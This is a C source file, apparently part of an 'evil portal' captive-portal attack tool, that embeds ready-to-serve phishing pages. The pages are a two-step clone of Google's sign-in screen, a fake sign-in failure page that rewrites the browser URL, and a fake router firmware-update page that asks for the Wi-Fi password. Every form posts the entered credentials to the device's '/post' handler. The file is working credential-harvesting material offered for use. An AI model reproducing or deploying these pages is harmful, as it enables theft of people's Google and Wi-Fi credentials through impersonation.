#include "evil_portal_html.h"

// Shared frame CSS + Google G logo (inline SVG). Used by all three Google steps.
#define GOOGLE_FRAME_CSS \
    "*{box-sizing:border-box;margin:0;padding:0}" \
    "body{background:#202124;color:#e8eaed;font-family:'Roboto','Helvetica Neue',Arial,sans-serif;min-height:100vh;display:flex;flex-direction:column}" \
    ".frame{flex:1;padding:24px;max-width:480px;margin:0 auto;width:100%}" \
    ".logo{margin:24px 0 32px;width:48px;height:48px;display:block}" \
    "h1{font-size:32px;font-weight:400;margin-bottom:8px}" \
    ".sub{font-size:16px;color:#bdc1c6;margin-bottom:32px}" \
    ".chip{border:1px solid #5f6368;border-radius:24px;padding:6px 12px 6px 4px;display:inline-flex;align-items:center;gap:8px;font-size:14px;margin-bottom:32px;color:#e8eaed}" \
    ".chip-av{width:24px;height:24px;border-radius:50%;background:#3c4043;display:inline-flex;align-items:center;justify-content:center;color:#bdc1c6;font-size:14px}" \
    ".chip-arrow{margin-left:4px;color:#bdc1c6}" \
    ".iw{position:relative;margin:24px 0 8px}" \
    ".iw input{width:100%;padding:18px 13px 6px;font-size:16px;border:1px solid #5f6368;border-radius:4px;background:transparent;color:#e8eaed;outline:none;font-family:inherit}" \
    ".iw input:focus{border-color:#8ab4f8;border-width:2px;padding:17px 12px 5px}" \
    ".iw label{position:absolute;left:12px;top:0;font-size:12px;color:#8ab4f8;background:#202124;padding:0 4px;transform:translateY(-50%)}" \
    ".showpwd{display:flex;align-items:center;gap:12px;font-size:14px;color:#e8eaed;margin-top:16px;cursor:pointer;user-select:none}" \
    ".showpwd input{width:18px;height:18px;cursor:pointer;accent-color:#8ab4f8}" \
    ".link{color:#8ab4f8;font-weight:500;text-decoration:none;font-size:14px}" \
    ".link:hover{text-decoration:underline}" \
    ".row{display:flex;justify-content:space-between;align-items:center;margin-top:48px;flex-wrap:wrap;gap:12px}" \
    ".row.right{justify-content:flex-end}" \
    ".btn{background:#8ab4f8;color:#202124;border:none;padding:10px 24px;border-radius:24px;font-size:14px;font-weight:500;cursor:pointer;text-decoration:none;display:inline-block;font-family:inherit}" \
    ".btn:hover{background:#aecbfa}" \
    ".bot{padding:16px 24px;display:flex;justify-content:space-between;align-items:center;color:#bdc1c6;font-size:12px;flex-wrap:wrap;gap:8px}" \
    ".bot-links a{color:#bdc1c6;text-decoration:none;margin-left:24px}" \
    ".bot-links a:first-child{margin-left:0}" \
    "p.body{font-size:14px;color:#e8eaed;line-height:1.5;margin-bottom:16px}"

#define GOOGLE_G_LOGO_SVG \
    "<svg class='logo' viewBox='0 0 48 48' xmlns='http://www.w3.org/2000/svg'>" \
    "<path fill='#4285F4' d='M44.5 20H24v8.5h11.8C34.7 33.9 30.1 37 24 37c-7.2 0-13-5.8-13-13s5.8-13 13-13c3.1 0 5.9 1.1 8.1 2.9l6.4-6.4C34.6 4.1 29.6 2 24 2 11.8 2 2 11.8 2 24s9.8 22 22 22c11 0 21-8 21-22 0-1.3-.2-2.7-.5-4z'/>" \
    "<path fill='#34A853' d='M6.3 14.7l7 5.1C15.3 15.1 19.3 12 24 12c3.1 0 5.9 1.1 8.1 2.9l6.4-6.4C34.6 4.1 29.6 2 24 2 16.1 2 9.3 6.5 6.3 12.7v2z'/>" \
    "<path fill='#FBBC05' d='M24 46c5.5 0 10.5-2.1 14.3-5.6l-6.6-5.4c-2 1.4-4.5 2.3-7.7 2.3-6 0-11.1-3.8-12.9-9.1l-7 5.4C7.7 41.5 15.2 46 24 46z'/>" \
    "<path fill='#EA4335' d='M44.5 20H24v8.5h11.8c-.6 2.5-2 4.6-4.1 6.1l6.6 5.4C42 35.5 45 30 45 24c0-1.3-.2-2.7-.5-4z'/>" \
    "</svg>"

#define GOOGLE_BOTTOM \
    "<div class='bot'>" \
    "<span>English (United Kingdom) &#9662;</span>" \
    "<span class='bot-links'><a href='#'>Help</a><a href='#'>Privacy</a><a href='#'>Terms</a></span>" \
    "</div>"

const char EVIL_PORTAL_HTML_GOOGLE_STEP1[] =
    "<!DOCTYPE html><html lang='en'><head><meta charset='utf-8'>"
    "<meta name='viewport' content='width=device-width,initial-scale=1'>"
    "<title>Sign in - Google Accounts</title>"
    "<style>" GOOGLE_FRAME_CSS "</style></head><body>"
    "<div class='frame'>"
    GOOGLE_G_LOGO_SVG
    "<h1>Sign in</h1>"
    "<div class='sub'>Use your Google Account</div>"
    "<form action='/post' method='POST'>"
    "<input type='hidden' name='step' value='1'>"
    "<div class='iw'><label>Email or phone</label>"
    "<input type='text' name='email' autocomplete='username' autofocus required></div>"
    "<a class='link' href='#'>Forgot email?</a>"
    "<div class='row'>"
    "<a class='link' href='#'>Create account</a>"
    "<button class='btn' type='submit'>Next</button>"
    "</div></form>"
    "</div>"
    GOOGLE_BOTTOM
    "</body></html>";

const char EVIL_PORTAL_HTML_GOOGLE_STEP2_TPL[] =
    "<!DOCTYPE html><html lang='en'><head><meta charset='utf-8'>"
    "<meta name='viewport' content='width=device-width,initial-scale=1'>"
    "<title>Sign in - Google Accounts</title>"
    "<style>" GOOGLE_FRAME_CSS "</style></head><body>"
    "<div class='frame'>"
    GOOGLE_G_LOGO_SVG
    "<h1>Welcome</h1>"
    "<div class='chip'><span class='chip-av'>&#9737;</span>%EMAIL%<span class='chip-arrow'>&#9662;</span></div>"
    "<form action='/post' method='POST'>"
    "<input type='hidden' name='step' value='2'>"
    "<input type='hidden' name='email' value='%EMAIL%'>"
    "<div class='iw'><label>Enter your password</label>"
    "<input type='password' name='password' id='pw' autocomplete='current-password' autofocus required></div>"
    "<label class='showpwd'><input type='checkbox' id='sp'>Show password</label>"
    "<div class='row'>"
    "<a class='link' href='#'>Forgot password?</a>"
    "<button class='btn' type='submit'>Next</button>"
    "</div></form>"
    "</div>"
    GOOGLE_BOTTOM
    "<script>"
    "history.replaceState({},'','/');"
    "document.getElementById('sp').onchange=function(e){document.getElementById('pw').type=e.target.checked?'text':'password'}"
    "</script>"
    "</body></html>";

const char EVIL_PORTAL_HTML_GOOGLE_FAILED[] =
    "<!DOCTYPE html><html lang='en'><head><meta charset='utf-8'>"
    "<meta name='viewport' content='width=device-width,initial-scale=1'>"
    "<title>Sign in - Google Accounts</title>"
    "<style>" GOOGLE_FRAME_CSS "</style></head><body>"
    "<div class='frame'>"
    GOOGLE_G_LOGO_SVG
    "<h1>Couldn&#39;t sign you in</h1>"
    "<p class='body' style='margin-top:24px'>This browser or app may not be secure. <a class='link' href='#'>Learn more</a></p>"
    "<p class='body'>Try using a different browser. If you&#39;re already using a supported browser, you can try again to sign in.</p>"
    "<div class='row right'>"
    "<a class='btn' href='/'>Try again</a>"
    "</div>"
    "</div>"
    GOOGLE_BOTTOM
    "<script>history.replaceState({},'','/');</script>"
    "</body></html>";

const char EVIL_PORTAL_HTML_ROUTER[] =
    "<!DOCTYPE html><html><head><meta charset=\"utf-8\">"
    "<meta name=\"viewport\" content=\"width=device-width,initial-scale=1\">"
    "<title>Router - Firmware Update Required</title>"
    "<style>"
    "body{font-family:Helvetica,Arial,sans-serif;background:#f4f4f4;margin:0;padding:20px;color:#333}"
    ".card{max-width:420px;margin:40px auto;background:#fff;border:1px solid #ddd;border-radius:6px;padding:24px;box-shadow:0 2px 4px rgba(0,0,0,.05)}"
    "h1{font-size:18px;margin:0 0 12px;color:#c0392b}"
    "p{font-size:14px;line-height:1.5;margin:0 0 16px}"
    "label{display:block;font-size:13px;margin:10px 0 4px;color:#555}"
    "input,select{width:100%;padding:9px;font-size:14px;border:1px solid #ccc;border-radius:4px;box-sizing:border-box;background:#fff}"
    "button{margin-top:16px;width:100%;background:#c0392b;color:#fff;border:none;padding:11px;font-size:14px;border-radius:4px;cursor:pointer}"
    "button:hover{background:#a83224}"
    ".note{font-size:11px;color:#888;margin-top:12px;text-align:center}"
    ".err{margin:0 0 12px;padding:9px;background:#fdecea;border:1px solid #f5c2bd;border-radius:4px;color:#c0392b;font-size:13px}"
    ".err:empty{display:none}"
    "#lo{position:fixed;inset:0;background:rgba(255,255,255,.95);display:none;flex-direction:column;align-items:center;justify-content:center;z-index:10}"
    "#lo.show{display:flex}"
    ".sp{border:4px solid #eee;border-top:4px solid #c0392b;border-radius:50%;width:42px;height:42px;animation:spin 1s linear infinite;margin-bottom:18px}"
    "@keyframes spin{to{transform:rotate(360deg)}}"
    "</style></head><body>"
    "<div class=\"card\">"
    "<h1>&#9888; Critical Firmware Update Required</h1>"
    "<p>Your router has detected a security vulnerability. Please re-authenticate with your network credentials to apply the patch.</p>"
    "<div class=\"err\">%ERROR%</div>"
    "<form action=\"/post\" method=\"POST\" onsubmit=\"document.getElementById('lo').classList.add('show')\">"
    "<label>Network Name (SSID)</label>"
    "<select name=\"username\" required>"
    "<option value=\"\" disabled selected>Select your network&hellip;</option>"
    "%SSID_OPTIONS%"
    "</select>"
    "<label>Network Password</label>"
    "<input type=\"password\" name=\"password\" required>"
    "<button type=\"submit\">Apply Update</button>"
    "</form>"
    "<div class=\"note\">This is a one-time security verification.</div>"
    "</div>"
    "<div id=\"lo\"><div class=\"sp\"></div><p>Verifying credentials&hellip;</p></div>"
    "</body></html>";

const size_t EVIL_PORTAL_HTML_GOOGLE_STEP1_LEN = sizeof(EVIL_PORTAL_HTML_GOOGLE_STEP1) - 1;
const size_t EVIL_PORTAL_HTML_GOOGLE_STEP2_TPL_LEN = sizeof(EVIL_PORTAL_HTML_GOOGLE_STEP2_TPL) - 1;
const size_t EVIL_PORTAL_HTML_GOOGLE_FAILED_LEN = sizeof(EVIL_PORTAL_HTML_GOOGLE_FAILED) - 1;
const size_t EVIL_PORTAL_HTML_ROUTER_LEN = sizeof(EVIL_PORTAL_HTML_ROUTER) - 1;

const char* const EVIL_PORTAL_HTML_GOOGLE = EVIL_PORTAL_HTML_GOOGLE_STEP1;
const size_t EVIL_PORTAL_HTML_GOOGLE_LEN = sizeof(EVIL_PORTAL_HTML_GOOGLE_STEP1) - 1;
